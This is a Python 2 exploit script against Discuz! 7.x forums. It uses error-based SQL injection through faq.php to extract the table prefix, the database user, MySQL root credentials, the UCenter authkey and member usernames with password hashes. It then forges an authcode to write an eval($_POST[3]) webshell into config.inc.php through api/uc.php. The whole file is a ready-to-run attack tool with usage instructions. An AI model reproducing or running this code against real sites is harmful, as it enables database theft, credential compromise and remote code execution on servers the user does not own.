#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: gb2312 -*-
# -*- coding: utf_8 -*-
# author iswin
import sys
import hashlib
import time
import math
import base64
import urllib2
import urllib
import re

def sendRequest(url,para):
	try:
		data = urllib.urlencode(para)
		req=urllib2.Request(url,data)
		res=urllib2.urlopen(req,timeout=20).read()
	except Exception, e:
		print 'Exploit Failed!\n%s'%(e)
		exit(0);
	return res

def getTablePrefix(url):
	print 'Start GetTablePrefix...'
	para={'action':'grouppermission','gids[99]':'\'','gids[100][0]':') and (select 1 from (select count(*),concat((select hex(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}
	res=sendRequest(url,para);
	pre=re.findall("Duplicate entry '(.*?)'",res);
	if len(pre)==0:
		print 'Exploit Failed!'
		exit(0);
	table_pre=pre[0][:len(pre[0])-1].decode('hex')
	table_pre=table_pre[0:table_pre.index('_')]
	print 'Table_pre:%s'%(table_pre)
	return table_pre

def getCurrentUser(url):
	para={'action':'grouppermission','gids[99]':'\'','gids[100][0]':') and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}
	res=sendRequest(url,para)
	pre=re.findall("Duplicate entry '(.*?)'",res)
	if len(pre)==0:
		print 'Exploit Failed!'
		exit(0);
	table_pre=pre[0][:len(pre[0])-1]
	print 'Current User:%s'%(table_pre)
	return table_pre

def getUcKey(url):
	para={'action':'grouppermission','gids[99]':'\'','gids[100][0]':') and (select 1 from (select count(*),concat((select substr(authkey,1,62) from cdb_uc_applications limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}
	para1={'action':'grouppermission','gids[99]':'\'','gids[100][0]':') and (select 1 from (select count(*),concat((select substr(authkey,63,2) from cdb_uc_applications limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}
	res=sendRequest(url,para);
	res1=sendRequest(url,para1);
	key1=re.findall("Duplicate entry '(.*?)'",res)
	key2=re.findall("Duplicate entry '(.*?)'",res1)
	if len(key1)==0:
		print 'Get Uc_Key Failed!'
		return ''
	key=key1[0][:len(key1[0])-1]+key2[0][:len(key2[0])-1]
	print 'uc_key:%s'%(key)
	return key

def getRootUser(url):
	para={'action':'grouppermission','gids[99]':'\'','gids[100][0]':') and (select 1 from (select count(*),concat((select concat(user,0x20,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'}
	res=sendRequest(url,para);
	pre=re.findall("Duplicate entry '(.*?)'",res)
	if len(pre)==0:
		print 'Exploit Failed!'
		exit(0);
	table_pre=pre[0][:len(pre[0])-1].split(' ')
	print 'root info:\nuser:%s password:%s'%(table_pre[0],table_pre[1])

def dumpData(url,table_prefix,count):
	para={'action':'grouppermission','gids[99]':'\'','gids[100][0]':') and (select 1 from (select count(*),concat((select concat(username,0x20,password) from %s_members limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#'%(table_prefix,count)}
	res=sendRequest(url,para);
	datas=re.findall("Duplicate entry '(.*?)'",res)
	if len(datas)==0:
		print 'Exploit Failed!'
		exit(0)
	cleandata=datas[0][:len(datas[0])-1]
	info=cleandata.split(' ')
	print 'user:%s pass:%s'%(info[0],info[1])

def microtime(get_as_float = False) :
    if get_as_float:
        return time.time()
    else:
        return '%.8f %d' % math.modf(time.time())

def get_authcode(string, key = ''):
    ckey_length = 4
    key = hashlib.md5(key).hexdigest()
    keya = hashlib.md5(key[0:16]).hexdigest()
    keyb = hashlib.md5(key[16:32]).hexdigest()
    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]
    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()
    key_length = len(cryptkey)
    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string
    string_length = len(string)
    result = ''
    box = range(0, 256)
    rndkey = dict()
    for i in range(0,256):
        rndkey[i] = ord(cryptkey[i % key_length])
    j=0
    for i in range(0,256):
        j = (j + box[i] + rndkey[i]) % 256
        tmp = box[i]
        box[i] = box[j]
        box[j] = tmp
    a=0
    j=0
    for i in range(0,string_length):
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        tmp = box[a]
        box[a] = box[j]
        box[j] = tmp
        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
    return keyc + base64.b64encode(result).replace('=', '')

def get_shell(url,key,host):
    headers={'Accept-Language':'zh-cn',
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
    'Referer':url
    }
    tm = time.time()+10*3600
    tm="time=%d&action=updateapps" %tm
    code = urllib.quote(get_authcode(tm,key))
    url=url+"?code="+code
    data1='''<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://xxx\');eval($_POST[3]);//</item>
            </root>'''
    try:
        req=urllib2.Request(url,data=data1,headers=headers)
        ret=urllib2.urlopen(req)
    except:
        return "Exploit Falied"
    data2='''<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://aaa</item>
            </root>'''
    try:
        req=urllib2.Request(url,data=data2,headers=headers)
        ret=urllib2.urlopen(req)
    except:
        return "error"

    try:
    	req=urllib2.Request(host+'/config.inc.php')
    	res=urllib2.urlopen(req,timeout=20).read()
    except Exception, e:
    	print 'GetWebshell Failed,%s'%(e)
     	return
    print "webshell:"+host+"/config.inc.php,password:3"

if __name__ == '__main__':
	print 'DZ7.x Exp Code By iswin'
	if len(sys.argv)<3:
		print 'DZ7.x Exp Code By iswin\nusage:python dz7.py http://www.iswin.org 10'
		exit(0)
	url=sys.argv[1]+'/faq.php'
	count=int(sys.argv[2])
	user=getCurrentUser(url)
	if user.startswith('root@'):
		getRootUser(url)
	uc_key=getUcKey(url)
	if len(uc_key)==64:
		print 'Start GetWebshell...'
		get_shell(sys.argv[1]+'/api/uc.php',uc_key,sys.argv[1])
	tb_pre=getTablePrefix(url)
	print 'Start DumpData...'
	for x in xrange(0,count):
		dumpData(url,tb_pre,x)
